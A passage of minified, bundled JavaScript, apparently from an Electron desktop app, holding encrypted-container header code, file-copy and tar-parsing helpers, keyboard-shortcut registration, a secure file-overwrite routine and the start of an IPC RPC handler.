			cipher: "aes-256-gcm",
			blobKey: {
				iv: Buffer.alloc(s.IV_LEN_BYTES),
				authTag: Buffer.alloc(16),
				key: Buffer.alloc(32)
			},
			blob: {
				iv: Buffer.alloc(s.IV_LEN_BYTES),
				authTag: Buffer.alloc(16)
			}
		}
	}, t.encryptBlobKey = function(e, t, n) {
		const {
			authTag: r,
			blob: o,
			iv: i,
			salt: c
		} = (0, s.boxEncrypt)(t, n, e.scrypt);
		e.scrypt.salt = c, e.blobKey = {
			authTag: r,
			iv: i,
			key: o
		}
	}, t.decryptBlobKey = function(e, t) {
		return (0, s.boxDecrypt)(t, e.blobKey.key, e.blobKey, e.scrypt)
	};
	var r, o = n(48),
		i = (r = o) && r.__esModule ? r : {
			default: r
		},
		s = n(59),
		c = n(58);
	const a = t.METADATA_LEN_BYTES = 256,
		u = t.struct = (0, i.default)((0, c.vsf)([
			["scrypt", [
				["salt", (0, o.Buffer)(32)],
				["n", o.UInt32BE],
				["r", o.UInt32BE],
				["p", o.UInt32BE]
			]],
			["cipher", (0, c.CStr)(32)],
			["blobKey", [
				["iv", (0, o.Buffer)(s.IV_LEN_BYTES)],
				["authTag", (0, o.Buffer)(16)],
				["key", (0, o.Buffer)(32)]
			]],
			["blob", [
				["iv", (0, o.Buffer)(s.IV_LEN_BYTES)],
				["authTag", (0, o.Buffer)(16)]
			]]
		]));

	function l(e) {
		return u.encode(e)
	}
}, function(e, t, n) {
	"use strict";
	var r = n(35);
	e.exports = function(e) {
		if (!r.isAbstractCodec(e)) throw new TypeError("lengthType is invalid codec");

		function t(t) {
			return e.encodingLength(t.length) + t.length
		}
		return {
			encode: function n(r, o, i) {
				if (!Buffer.isBuffer(r)) throw new TypeError("value must be a Buffer instance");
				if (o || (o = new Buffer(t(r))), i || (i = 0), e.encode(r.length, o, i), (i += e.encode.bytes) + r.length > o.length) throw new RangeError("destination buffer is too small");
				return r.copy(o, i, 0, r.length), n.bytes = e.encode.bytes + r.length, o
			},
			decode: function t(n, r, o) {
				r || (r = 0), o || (o = n.length);
				var i = e.decode(n, r, o);
				if ((r += e.decode.bytes) + i > o) throw new RangeError("not enough data for decode");
				return t.bytes = e.decode.bytes + i, new Buffer(n.slice(r, r + i))
			},
			encodingLength: function(e) {
				if (!Buffer.isBuffer(e)) throw new TypeError("value must be a Buffer instance");
				return t(e)
			}
		}
	}
}, function(e, t, n) {
	"use strict";
	e.exports = function(e) {
		if ("number" != typeof e) throw new TypeError("length must be a number");

		function t(t, n, r) {
			if (!Buffer.isBuffer(t)) throw new TypeError("value must be a Buffer instance");
			if (t.length !== e) throw new RangeError("value.length is out of bounds");
			if (!n) return new Buffer(t);
			if (r || (r = 0), r + e > n.length) throw new RangeError("destination buffer is too small");
			return t.copy(n, r), n
		}

		function n(t, n, r) {
			if (n || (n = 0), r || (r = t.length), n + e > r) throw new RangeError("not enough data for decode");
			return new Buffer(t.slice(n, n + e))
		}
		return t.bytes = n.bytes = e, {
			encode: t,
			decode: n,
			encodingLength: function() {
				return e
			}
		}
	}
}, function(e, t, n) {
	"use strict";
	Object.defineProperty(t, "__esModule", {
		value: !0
	}), t.struct = t.MAGIC = t.HEADER_VERSION_TAG = t.HEADER_LEN_BYTES = void 0, t.checkMagic = l, t.decode = function(e) {
		e.byteLength > c && console.warn(`header greater than ${c} bytes, are you sure this is the header?`);
		return f.decode(e)
	}, t.encode = d, t.serialize = function(e) {
		let t = Buffer.alloc(c);
		return d(e).copy(t), t
	}, t.create = function({
		appName: e,
		appVersion: t
	} = {
		appName: "",
		appVersion: ""
	}) {
		return {
			magic: u,
			version: 0,
			reserved: 0,
			versionTag: a,
			appName: e,
			appVersion: t
		}
	};
	var r, o = n(48),
		i = (r = o) && r.__esModule ? r : {
			default: r
		},
		s = n(58);
	const c = t.HEADER_LEN_BYTES = 224,
		a = t.HEADER_VERSION_TAG = "seco-v0-scrypt-aes",
		u = t.MAGIC = Buffer.from("SECO", "utf8");

	function l(e) {
		if (!e.equals(u)) throw new RangeError("Invalid secure container magic.")
	}
	const f = t.struct = (0, i.default)((0, s.vsf)([
		["magic", (0, o.Bound)(i.default.Buffer(4), l)],
		["version", o.UInt32BE],
		["reserved", o.UInt32BE],
		["versionTag", (0, o.VarString)(o.UInt8)],
		["appName", (0, o.VarString)(o.UInt8, "utf-8")],
		["appVersion", (0, o.VarString)(o.UInt8, "utf-8")]
	]));

	function d(e) {
		return f.encode(e)
	}
}, function(e, t) {
	e.exports = function(e) {
		if ("function" == typeof Buffer.allocUnsafe) try {
			return Buffer.allocUnsafe(e)
		} catch (t) {
			return new Buffer(e)
		}
		return new Buffer(e)
	}
}, function(e, t, n) {
	e.exports = {
		copySync: n(141)
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(33),
		i = n(1);
	e.exports = {
		hasMillisRes: function(e) {
			let t = i.join("millis-test" + Date.now().toString() + Math.random().toString().slice(2));
			t = i.join(o.tmpdir(), t);
			const n = new Date(1435410243862);
			r.writeFile(t, "https://github.com/jprichardson/node-fs-extra/pull/141", o => {
				if (o) return e(o);
				r.open(t, "r+", (o, i) => {
					if (o) return e(o);
					r.futimes(i, n, n, n => {
						if (n) return e(n);
						r.close(i, n => {
							if (n) return e(n);
							r.stat(t, (t, n) => {
								if (t) return e(t);
								e(null, n.mtime > 1435410243e3)
							})
						})
					})
				})
			})
		},
		hasMillisResSync: function() {
			let e = i.join("millis-test-sync" + Date.now().toString() + Math.random().toString().slice(2));
			e = i.join(o.tmpdir(), e);
			const t = new Date(1435410243862);
			r.writeFileSync(e, "https://github.com/jprichardson/node-fs-extra/pull/141");
			const n = r.openSync(e, "r+");
			return r.futimesSync(n, t, t), r.closeSync(n), r.statSync(e).mtime > 1435410243e3
		},
		timeRemoveMillis: function(e) {
			if ("number" == typeof e) return 1e3 * Math.floor(e / 1e3);
			if (e instanceof Date) return new Date(1e3 * Math.floor(e.getTime() / 1e3));
			throw new Error("fs-extra: timeRemoveMillis() unknown parameter type")
		},
		utimesMillis: function(e, t, n, o) {
			r.open(e, "r+", (e, i) => {
				if (e) return o(e);
				r.futimes(i, t, n, e => {
					r.close(i, t => {
						o && o(e || t)
					})
				})
			})
		},
		utimesMillisSync: function(e, t, n) {
			const o = r.openSync(e, "r+");
			return r.futimesSync(o, t, n), r.closeSync(o)
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(1);

	function o(e) {
		return (e = r.normalize(r.resolve(e)).split(r.sep)).length > 0 ? e[0] : null
	}
	const i = /[<>:"|?*]/;
	e.exports = {
		getRootPath: o,
		invalidWin32Path: function(e) {
			const t = o(e);
			return e = e.replace(t, ""), i.test(e)
		}
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7),
		o = n(1),
		i = n(19).mkdirs,
		s = n(31).pathExists,
		c = n(77).utimesMillis,
		a = Symbol("notExist"),
		u = Symbol("existsReg");

	function l(e, t, n, r) {
		const c = o.dirname(t);
		s(c, (o, s) => o ? r(o) : s ? f(e, t, n, r) : void i(c, o => o ? r(o) : f(e, t, n, r)))
	}

	function f(e, t, n, r) {
		return n.filter ? d(p, e, t, n, r) : p(e, t, n, r)
	}

	function d(e, t, n, r, o) {
		Promise.resolve(r.filter(t, n)).then(i => i ? e(t, n, r, o) : o(), e => o(e))
	}

	function p(e, t, n, i) {
		(n.dereference ? r.stat : r.lstat)(e, (s, c) => s ? i(s) : c.isDirectory() ? function(e, t, n, o, i) {
			b(n, (s, c) => s ? i(s) : c === a ? g(t, n) ? i(new Error(`Cannot copy '${t}' to a subdirectory of itself, '${n}'.`)) : function(e, t, n, o, i) {
				r.mkdir(n, e.mode, s => {
					if (s) return i(s);
					r.chmod(n, e.mode, e => e ? i(e) : w(t, n, o, i))
				})
			}(e, t, n, o, i) : c === u ? g(t, n) ? i(new Error(`Cannot copy '${t}' to a subdirectory of itself, '${n}'.`)) : function(e, t, n, o) {
				r.stat(t, (r, i) => r ? o(r) : i.isDirectory() ? w(e, t, n, o) : o(new Error(`Cannot overwrite non-directory '${t}' with directory '${e}'.`)))
			}(t, n, o, i) : t === c ? i() : w(t, n, o, i))
		}(c, e, t, n, i) : c.isFile() || c.isCharacterDevice() || c.isBlockDevice() ? function(e, t, n, r, o) {
			b(n, (i, s) => i ? o(i) : s === a ? y(e, t, n, r, o) : s === u ? h(e, t, n, r, o) : t === s ? o() : h(e, t, n, r, o))
		}(c, e, t, n, i) : c.isSymbolicLink() ? function(e, t, n, i) {
			r.readlink(e, (e, s) => {
				if (e) return i(e);
				n.dereference && (s = o.resolve(process.cwd(), s)), b(t, (e, c) => e ? i(e) : c === a || c === u ? r.symlink(s, t, i) : (n.dereference && (c = o.resolve(process.cwd(), c)), c === s ? i() : void r.stat(t, (e, n) => e ? i(e) : n.isDirectory() && g(c, s) ? i(new Error(`Cannot overwrite '${c}' with '${s}'.`)) : function(e, t, n) {
					r.unlink(t, o => o ? n(o) : r.symlink(e, t, n))
				}(s, t, i))))
			})
		}(e, t, n, i) : void 0)
	}

	function h(e, t, n, o, i) {
		if (!o.overwrite) return o.errorOnExist ? i(new Error(`'${n}' already exists`)) : i();
		r.unlink(n, r => r ? i(r) : y(e, t, n, o, i))
	}

	function y(e, t, n, o, i) {
		return "function" == typeof r.copyFile ? r.copyFile(t, n, t => t ? i(t) : m(e, n, o, i)) : function(e, t, n, o, i) {
			const s = r.createReadStream(t);
			s.on("error", e => i(e)).once("open", () => {
				const t = r.createWriteStream(n, {
					mode: e.mode
				});
				t.on("error", e => i(e)).on("open", () => s.pipe(t)).once("close", () => m(e, n, o, i))
			})
		}(e, t, n, o, i)
	}

	function m(e, t, n, o) {
		r.chmod(t, e.mode, r => r ? o(r) : n.preserveTimestamps ? c(t, e.atime, e.mtime, o) : o())
	}

	function w(e, t, n, i) {
		r.readdir(e, (r, s) => r ? i(r) : function e(t, n, r, i, s) {
			const c = t.pop();
			if (!c) return s();
			f(o.join(n, c), o.join(r, c), i, o => o ? s(o) : e(t, n, r, i, s))
		}(s, e, t, n, i))
	}

	function b(e, t) {
		r.readlink(e, (e, n) => e ? "ENOENT" === e.code ? t(null, a) : "EINVAL" === e.code || "UNKNOWN" === e.code ? t(null, u) : t(e) : t(null, n))
	}

	function g(e, t) {
		const n = t.split(o.dirname(e) + o.sep)[1];
		if (n) {
			const r = n.split(o.sep)[0];
			return !!r && (e !== t && t.indexOf(e) > -1 && r === o.basename(e))
		}
		return !1
	}
	e.exports = function(e, t, n, r) {
		return "function" != typeof n || r ? "function" == typeof n && (n = {
			filter: n
		}) : (r = n, n = {}), r = r || function() {}, (n = n || {}).clobber = !("clobber" in n && !n.clobber), n.overwrite = "overwrite" in n ? !!n.overwrite : n.clobber, n.preserveTimestamps && "ia32" === process.arch && console.warn("fs-extra: Using the preserveTimestamps option in 32-bit node is not recommended;\n\n    see https://github.com/jprichardson/node-fs-extra/issues/269"), (e = o.resolve(e)) === (t = o.resolve(t)) ? r(new Error("Source and destination must not be the same.")) : n.filter ? d(l, e, t, n, r) : l(e, t, n, r)
	}
}, function(e, t, n) {
	const r = n(16).fromCallback,
		o = n(7),
		i = ["access", "appendFile", "chmod", "chown", "close", "copyFile", "fchmod", "fchown", "fdatasync", "fstat", "fsync", "ftruncate", "futimes", "lchown", "link", "lstat", "mkdir", "mkdtemp", "open", "readFile", "readdir", "readlink", "realpath", "rename", "rmdir", "stat", "symlink", "truncate", "unlink", "utimes", "writeFile"].filter(e => "function" == typeof o[e]);
	Object.keys(o).forEach(e => {
		t[e] = o[e]
	}), i.forEach(e => {
		t[e] = r(o[e])
	}), t.exists = function(e, t) {
		return "function" == typeof t ? o.exists(e, t) : new Promise(t => o.exists(e, t))
	}, t.read = function(e, t, n, r, i, s) {
		return "function" == typeof s ? o.read(e, t, n, r, i, s) : new Promise((s, c) => {
			o.read(e, t, n, r, i, (e, t, n) => {
				if (e) return c(e);
				s({
					bytesRead: t,
					buffer: n
				})
			})
		})
	}, t.write = function(e, t, n, r, i, s) {
		return "function" == typeof arguments[arguments.length - 1] ? o.write(e, t, n, r, i, s) : "string" == typeof t ? new Promise((i, s) => {
			o.write(e, t, n, r, (e, t, n) => {
				if (e) return s(e);
				i({
					bytesWritten: t,
					buffer: n
				})
			})
		}) : new Promise((s, c) => {
			o.write(e, t, n, r, i, (e, t, n) => {
				if (e) return c(e);
				s({
					bytesWritten: t,
					buffer: n
				})
			})
		})
	}
}, function(e, t, n) {
	"use strict";
	const r = n(7);
	e.exports = {
		utimesMillis: function(e, t, n, o) {
			r.open(e, "r+", (e, i) => {
				if (e) return o(e);
				r.futimes(i, t, n, e => {
					r.close(i, t => {
						o && o(e || t)
					})
				})
			})
		},
		utimesMillisSync: function(e, t, n) {
			const o = r.openSync(e, "r+");
			return r.futimesSync(o, t, n), r.closeSync(o)
		}
	}
}, function(e, t, n) {
	"use strict";
	e.exports = function(e, t) {
		if ("function" != typeof e) throw new TypeError("Expected a function.");
		var n, r = !1,
			o = e.name || (/function ([^\(]+)/.exec(e.toString()) || [])[1];
		return function() {
			if (r) {
				if (!0 === t) throw o = o ? o + "()" : "Function", new Error(o + " can only be called once.");
				return n
			}
			return r = !0, n = e.apply(this, arguments), e = null, n
		}
	}
}, function(e, t, n) {
	"use strict";
	const {
		app: r,
		BrowserWindow: o
	} = n(0), i = n(100), s = n(99), {
		toKeyEvent: c
	} = n(98), a = n(97)("electron-localshortcut"), u = {}, l = new WeakMap, f = e => {
		if (e) try {
			return e.getTitle()
		} catch (e) {
			return "A destroyed window"
		}
		return "An falsy value"
	};

	function d(e) {
		if (!i(e)) {
			const t = {};
			Error.captureStackTrace(t);
			const n = `\nWARNING: ${e} is not a valid accelerator.\n\n${t.stack?t.stack.split("\n").slice(4).join("\n"):t.message}\n`;
			console.error(n)
		}
	}

	function p(e, t) {
		let n = 0;
		for (const r of t) {
			if (s(r.eventStamp, e)) return n;
			n++
		}
		return -1
	}
	const h = e => (t, n) => {
		if ("keyUp" === n.type) return;
		const r = function(e) {
			const t = {
				code: e.code,
				key: e.key
			};
			return ["alt", "shift", "meta"].forEach(n => {
				void 0 !== e[n] && (t[`${n}Key`] = e[n])
			}), void 0 !== e.control && (t.ctrlKey = e.control), t
		}(n);
		a(`before-input-event: ${n} is translated to: ${r}`);
		for (const {
				eventStamp: t,
				callback: n
			} of e) {
			if (s(t, r)) return a(`eventStamp: ${t} match`), void n();
			a(`eventStamp: ${t} no match`)
		}
	};
	e.exports = {
		register: function e(t, n, i) {
			let s, p;
			if (void 0 === i ? (s = u, i = n, n = t) : s = t.webContents, !0 === Array.isArray(n)) return void n.forEach(n => {
				"string" == typeof n && e(t, n, i)
			});
			if (a(`Registering callback for ${n} on window ${f(t)}`), d(n), a(`${n} seems a valid shortcut sequence.`), l.has(s)) a("Window has others shortcuts registered."), p = l.get(s);
			else if (a("This is the first shortcut of the window."), p = [], l.set(s, p), s === u) {
				const e = h(p),
					t = (t, n) => {
						const r = n.webContents;
						r.on("before-input-event", e), r.once("closed", () => r.removeListener("before-input-event", e))
					};
				o.getAllWindows().forEach(e => t(null, e)), r.on("browser-window-created", t), p.removeListener = (() => {
					o.getAllWindows().forEach(t => t.webContents.removeListener("before-input-event", e)), r.removeListener("browser-window-created", t)
				})
			} else {
				const e = h(p);
				s.on("before-input-event", e), p.removeListener = (() => s.removeListener("before-input-event", e)), s.once("closed", p.removeListener)
			}
			a("Adding shortcut to window set.");
			const y = c(n);
			p.push({
				eventStamp: y,
				callback: i,
				enabled: !0
			}), a("Shortcut registered.")
		},
		unregister: function e(t, n) {
			let r;
			if (void 0 === n) r = u, n = t;
			else {
				if (t.isDestroyed()) return void a("Early return because window is destroyed.");
				r = t.webContents
			}
			if (!0 === Array.isArray(n)) return void n.forEach(n => {
				"string" == typeof n && e(t, n)
			});
			if (a(`Unregistering callback for ${n} on window ${f(t)}`), d(n), a(`${n} seems a valid shortcut sequence.`), !l.has(r)) return void a("Early return because window has never had shortcuts registered.");
			const o = l.get(r),
				i = p(c(n), o); - 1 !== i && (o.splice(i, 1), 0 === o.length && (o.removeListener(), l.delete(r)))
		},
		isRegistered: function(e, t) {
			d(t);
			const n = e.webContents,
				r = l.get(n);
			return -1 !== p(c(t), r)
		},
		unregisterAll: function(e) {
			a(`Unregistering all shortcuts on window ${f(e)}`);
			const t = e.webContents,
				n = l.get(t);
			n && n.removeListener && (n.removeListener(), l.delete(t))
		},
		enableAll: function(e) {
			a(`Enabling all shortcuts on window ${f(e)}`);
			const t = e.webContents,
				n = l.get(t);
			for (const e of n) e.enabled = !0
		},
		disableAll: function(e) {
			a(`Disabling all shortcuts on window ${f(e)}`);
			const t = e.webContents,
				n = l.get(t);
			for (const e of n) e.enabled = !1
		}
	}
}, function(e, t, n) {
	var r = n(32),
		o = n(108),
		i = n(103),
		s = n(57).Writable,
		c = n(57).PassThrough,
		a = function() {},
		u = function(e) {
			return (e &= 511) && 512 - e
		},
		l = function(e, t) {
			this._parent = e, this.offset = t, c.call(this, {
				autoDestroy: !1
			})
		};
	r.inherits(l, c), l.prototype.destroy = function(e) {
		this._parent.destroy(e)
	};
	var f = function(e) {
		if (!(this instanceof f)) return new f(e);
		s.call(this, e), e = e || {}, this._offset = 0, this._buffer = o(), this._missing = 0, this._partial = !1, this._onparse = a, this._header = null, this._stream = null, this._overflow = null, this._cb = null, this._locked = !1, this._destroyed = !1, this._pax = null, this._paxGlobal = null, this._gnuLongPath = null, this._gnuLongLinkPath = null;
		var t = this,
			n = t._buffer,
			r = function() {
				t._continue()
			},
			c = function(e) {
				if (t._locked = !1, e) return t.destroy(e);
				t._stream || r()
			},
			d = function() {
				t._stream = null;
				var e = u(t._header.size);
				e ? t._parse(e, p) : t._parse(512, b), t._locked || r()
			},
			p = function() {
				t._buffer.consume(u(t._header.size)), t._parse(512, b), r()
			},
			h = function() {
				var e = t._header.size;
				t._paxGlobal = i.decodePax(n.slice(0, e)), n.consume(e), d()
			},
			y = function() {
				var e = t._header.size;
				t._pax = i.decodePax(n.slice(0, e)), t._paxGlobal && (t._pax = Object.assign({}, t._paxGlobal, t._pax)), n.consume(e), d()
			},
			m = function() {
				var r = t._header.size;
				this._gnuLongPath = i.decodeLongPath(n.slice(0, r), e.filenameEncoding), n.consume(r), d()
			},
			w = function() {
				var r = t._header.size;
				this._gnuLongLinkPath = i.decodeLongPath(n.slice(0, r), e.filenameEncoding), n.consume(r), d()
			},
			b = function() {
				var o, s = t._offset;
				try {
					o = t._header = i.decode(n.slice(0, 512), e.filenameEncoding)
				} catch (e) {
					t.emit("error", e)
				}
				return n.consume(512), o ? "gnu-long-path" === o.type ? (t._parse(o.size, m), void r()) : "gnu-long-link-path" === o.type ? (t._parse(o.size, w), void r()) : "pax-global-header" === o.type ? (t._parse(o.size, h), void r()) : "pax-header" === o.type ? (t._parse(o.size, y), void r()) : (t._gnuLongPath && (o.name = t._gnuLongPath, t._gnuLongPath = null), t._gnuLongLinkPath && (o.linkname = t._gnuLongLinkPath, t._gnuLongLinkPath = null), t._pax && (t._header = o = function(e, t) {
					return t.path && (e.name = t.path), t.linkpath && (e.linkname = t.linkpath), t.size && (e.size = parseInt(t.size, 10)), e.pax = t, e
				}(o, t._pax), t._pax = null), t._locked = !0, o.size && "directory" !== o.type ? (t._stream = new l(t, s), t.emit("entry", o, t._stream, c), t._parse(o.size, d), void r()) : (t._parse(512, b), void t.emit("entry", o, function(e, t) {
					var n = new l(e, t);
					return n.end(), n
				}(t, s), c))) : (t._parse(512, b), void r())
			};
		this._onheader = b, this._parse(512, b)
	};
	r.inherits(f, s), f.prototype.destroy = function(e) {
		this._destroyed || (this._destroyed = !0, e && this.emit("error", e), this.emit("close"), this._stream && this._stream.emit("close"))
	}, f.prototype._parse = function(e, t) {
		this._destroyed || (this._offset += e, this._missing = e, t === this._onheader && (this._partial = !1), this._onparse = t)
	}, f.prototype._continue = function() {
		if (!this._destroyed) {
			var e = this._cb;
			this._cb = a, this._overflow ? this._write(this._overflow, void 0, e) : e()
		}
	}, f.prototype._write = function(e, t, n) {
		if (!this._destroyed) {
			var r = this._stream,
				o = this._buffer,
				i = this._missing;
			if (e.length && (this._partial = !0), e.length < i) return this._missing -= e.length, this._overflow = null, r ? r.write(e, n) : (o.append(e), n());
			this._cb = n, this._missing = 0;
			var s = null;
			e.length > i && (s = e.slice(i), e = e.slice(0, i)), r ? r.end(e) : o.append(e), this._overflow = s, this._onparse()
		}
	}, f.prototype._final = function(e) {
		if (this._partial) return this.destroy(new Error("Unexpected end of data"));
		e()
	}, e.exports = f
}, function(e, t, n) {
	const r = n(9),
		{
			createStorageInternal: o,
			addNamespacing: i
		} = n(149),
		{
			getLockFile: s
		} = n(70);
	e.exports = {
		createStorage: function(e) {
			const t = o(e);
			return i(t)
		},
		isStorageWriting: function(e) {
			return r.pathExistsSync(s(e))
		}
	}
}, function(e, t) {
	e.exports = require("events")
}, function(e, t, n) {
	const r = n(155),
		{
			randomBytes: o
		} = n(28);
	e.exports = async function(e, t = {}) {
		let n, i;
		const s = Buffer.alloc(16384);
		try {
			const c = await r.stat(e);
			if (!c.isFile()) throw new Error(`${e} is not file`);
			let a = c.size;
			if (t.size) {
				const e = t.size.toString().match(/^(\d+)([KMG]?)$/);
				if (null === e) throw new Error(`invalid size: ${t.size}`);
				a = parseInt(e[1], 10) * ("K" === e[2] ? 1024 : "M" === e[2] ? 1048576 : "G" === e[2] ? 1073741824 : 1)
			}
			let u = 3;
			if (t.iterations) {
				if (null === t.iterations.toString().match(/^\d+$/)) throw new Error(`invalid iterations: ${t.iterations}`);
				u = parseInt(t.iterations, 10)
			}
			if (!(u >= 1)) throw new Error(`invalid iterations: ${t.iterations}`);
			if (t.zero && (u -= 1), n = await r.open(e, "w"), t.randomSource) {
				i = await r.open(t.randomSource, "r");
				let e = 0;
				for (let r = 0, o = 0; r < u; ++r)
					for (; o < a;) {
						const r = Math.min(s.length, a - o),
							{
								bytesRead: c
							} = await i.read(s, 0, r, e);
						if (0 === c) throw new Error(`not enough data in ${t.randomSource}`);
						e += c;
						const {
							bytesWritten: u
						} = await n.write(s, 0, c, o);
						if (u !== c) throw new Error("lost data on overwrite");
						o += c
					}
				await i.close(), i = void 0
			} else
				for (let e = 0; e < u; ++e)
					for (let e = 0; e < a;) {
						const t = Math.min(16384, a - e),
							r = o(t),
							{
								bytesWritten: i
							} = await n.write(r, 0, t, e);
						if (i !== t) throw new Error("lost data on overwrite");
						e += t
					}
			if (t.zero) {
				s.fill(0);
				for (let e = 0; e < a;) {
					const t = Math.min(s.length, a - e),
						{
							bytesWritten: r
						} = await n.write(s, 0, t, e);
					if (r !== t) throw new Error("lost data on overwrite");
					e += t
				}
			}
			await n.close(), n = void 0, t.remove && await r.unlink(e)
		} catch (e) {
			throw await Promise.all([n, i].filter(e => !!e).map(e => e.close().catch(() => {}))).catch(() => {}), e
		}
	}
}, function(e, t) {
	function n(e) {
		if (!(this instanceof n)) return new n(e);
		this.value = e
	}

	function r(e, t, n) {
		var r = [],
			i = [],
			s = !0;
		return function e(c) {
			var a = n ? o(c) : c,
				u = {},
				l = {
					node: a,
					node_: c,
					path: [].concat(r),
					parent: i.slice(-1)[0],
					key: r.slice(-1)[0],
					isRoot: 0 === r.length,
					level: r.length,
					circular: null,
					update: function(e) {
						l.isRoot || (l.parent.node[l.key] = e), l.node = e
					},
					delete: function() {
						delete l.parent.node[l.key]
					},
					remove: function() {
						Array.isArray(l.parent.node) ? l.parent.node.splice(l.key, 1) : delete l.parent.node[l.key]
					},
					before: function(e) {
						u.before = e
					},
					after: function(e) {
						u.after = e
					},
					pre: function(e) {
						u.pre = e
					},
					post: function(e) {
						u.post = e
					},
					stop: function() {
						s = !1
					}
				};
			if (!s) return l;
			if ("object" == typeof a && null !== a) {
				l.isLeaf = 0 == Object.keys(a).length;
				for (var f = 0; f < i.length; f++)
					if (i[f].node_ === c) {
						l.circular = i[f];
						break
					}
			} else l.isLeaf = !0;
			l.notLeaf = !l.isLeaf, l.notRoot = !l.isRoot;
			var d = t.call(l, l.node);
			if (void 0 !== d && l.update && l.update(d), u.before && u.before.call(l, l.node), "object" == typeof l.node && null !== l.node && !l.circular) {
				i.push(l);
				var p = Object.keys(l.node);
				p.forEach(function(t, o) {
					r.push(t), u.pre && u.pre.call(l, l.node[t], t);
					var i = e(l.node[t]);
					n && Object.hasOwnProperty.call(l.node, t) && (l.node[t] = i.node), i.isLast = o == p.length - 1, i.isFirst = 0 == o, u.post && u.post.call(l, i), r.pop()
				}), i.pop()
			}
			return u.after && u.after.call(l, l.node), l
		}(e).node
	}

	function o(e) {
		var t;
		return "object" == typeof e && null !== e ? (t = Array.isArray(e) ? [] : e instanceof Date ? new Date(e) : e instanceof Boolean ? new Boolean(e) : e instanceof Number ? new Number(e) : e instanceof String ? new String(e) : Object.create(Object.getPrototypeOf(e)), Object.keys(e).forEach(function(n) {
			t[n] = e[n]
		}), t) : e
	}
	e.exports = n, n.prototype.get = function(e) {
		for (var t = this.value, n = 0; n < e.length; n++) {
			var r = e[n];
			if (!Object.hasOwnProperty.call(t, r)) {
				t = void 0;
				break
			}
			t = t[r]
		}
		return t
	}, n.prototype.set = function(e, t) {
		for (var n = this.value, r = 0; r < e.length - 1; r++) {
			var o = e[r];
			Object.hasOwnProperty.call(n, o) || (n[o] = {}), n = n[o]
		}
		return n[e[r]] = t, t
	}, n.prototype.map = function(e) {
		return r(this.value, e, !0)
	}, n.prototype.forEach = function(e) {
		return this.value = r(this.value, e, !1), this.value
	}, n.prototype.reduce = function(e, t) {
		var n = 1 === arguments.length,
			r = n ? this.value : t;
		return this.forEach(function(t) {
			this.isRoot && n || (r = e.call(this, r, t))
		}), r
	}, n.prototype.deepEqual = function(e) {
		if (1 !== arguments.length) throw new Error("deepEqual requires exactly one object to compare against");
		var t = !0,
			r = e;
		return this.forEach(function(o) {
			var i = function() {
				t = !1
			}.bind(this);
			if (!this.isRoot) {
				if ("object" != typeof r) return i();
				r = r[this.key]
			}
			var s = r;
			this.post(function() {
				r = s
			});
			var c = function(e) {
				return Object.prototype.toString.call(e)
			};
			if (this.circular) n(e).get(this.circular.path) !== s && i();
			else if (typeof s != typeof o) i();
			else if (null === s || null === o || void 0 === s || void 0 === o) s !== o && i();
			else if (s.__proto__ !== o.__proto__) i();
			else if (s === o);
			else if ("function" == typeof s) s instanceof RegExp ? s.toString() != o.toString() && i() : s !== o && i();
			else if ("object" == typeof s)
				if ("[object Arguments]" === c(o) || "[object Arguments]" === c(s)) c(s) !== c(o) && i();
				else if (s instanceof Date || o instanceof Date) s instanceof Date && o instanceof Date && s.getTime() === o.getTime() || i();
			else {
				var a = Object.keys(s),
					u = Object.keys(o);
				if (a.length !== u.length) return i();
				for (var l = 0; l < a.length; l++) {
					var f = a[l];
					Object.hasOwnProperty.call(o, f) || i()
				}
			}
		}), t
	}, n.prototype.paths = function() {
		var e = [];
		return this.forEach(function(t) {
			e.push(this.path)
		}), e
	}, n.prototype.nodes = function() {
		var e = [];
		return this.forEach(function(t) {
			e.push(this.node)
		}), e
	}, n.prototype.clone = function() {
		var e = [],
			t = [];
		return function n(r) {
			for (var i = 0; i < e.length; i++)
				if (e[i] === r) return t[i];
			if ("object" == typeof r && null !== r) {
				var s = o(r);
				return e.push(r), t.push(s), Object.keys(r).forEach(function(e) {
					s[e] = n(r[e])
				}), e.pop(), t.pop(), s
			}
			return r
		}(this.value)
	}, Object.keys(n.prototype).forEach(function(e) {
		n[e] = function(t) {
			var r = [].slice.call(arguments, 1),
				o = n(t);
			return o[e].apply(o, r)
		}
	})
}, function(e, t) {
	function n(e) {
		return e instanceof Error ? {
			...e,
			name: e.name,
			message: e.message,
			stack: r(e.stack)
		} : {
			name: e.name || "UNKNOWN",
			message: JSON.stringify(e)
		}
	}

	function r(e) {
		return e.replace(/\/Users\/[^/]+/g, "").replace(/\\Users\\[^\\]+/g, "").replace(/\/home\/[^/]+/g, "")
	}
	e.exports = {
		toObject: n,
		JSONReplacer: function(e, t) {
			return t instanceof Error ? n(t) : t
		},
		cleanStack: r
	}
}, function(e, t, n) {
	"use strict";
	n.r(t);
	var r = n(0),
		o = n(2),
		i = n(6),
		s = n(89);
	const c = "electron-rpc-broadcast";

	function a(e, t, n, r, o, i, {
		wrap: a,
		unwrap: u
	} = {}) {
		const l = `${c}:${r}:call`,
			f = async (e, l) => {
				const f = n(e, l);
				if (!o.includes(f)) return void console.error(`Skipping unexpected message from (${f}) to channel: ${r}`);
				const {
					func: d,
					args: p,
					token: h
				} = l.payload, [y, m] = await async function(e, t) {
					if ("function" == typeof i[e]) try {
						u && u(e, t);
						const n = await i[e](...t);
						return a && a(e, n), [null, n]
					} catch (e) {
						return [e, null]
					}
					try {
						return [null, i[e]]
					} catch (e) {
						return [e]
					}
				}(d, p), w = y ? Object(s.toObject)(y) : null;
				t(f, `${c}:${r}:response:${h}`, [w, m])
			};
		return e.on(l, f), {
			stop: () => e.removeListener(l, f)
		}
	}
	var u = n(15),
		l = n(8);

	function f(e) {
		const t = Object(l.getWebContentsMeta)(e);
		return t && !0 === t.ipc ? t.type : void 0
	}

	function d() {
		return Object(u.allWebContents)().map(e => ({
			contents: e,
			type: f(e)
		})).filter(e => e.type)
	}
	var p = n(88),
		h = n.n(p),
		y = e => void 0 === globalThis.Buffer ? e : (h()(e).forEach(function(e) {
			e instanceof Uint8Array && this.update(globalThis.Buffer.from(e))
		}), e);
	const m = new WeakMap,
		w = new WeakMap;

	function b(e, t, n) {
		const r = w.get(e);
		if (r && (r.filter !== t || r.useBuffers !== n)) throw new Error("Attempting to register the same handler with different parameters");
		w.set(e, {
			filter: t,
			useBuffers: n
		});
		const o = m.get(e);
		if (o) return o;
		const i = (r, ...o) => {
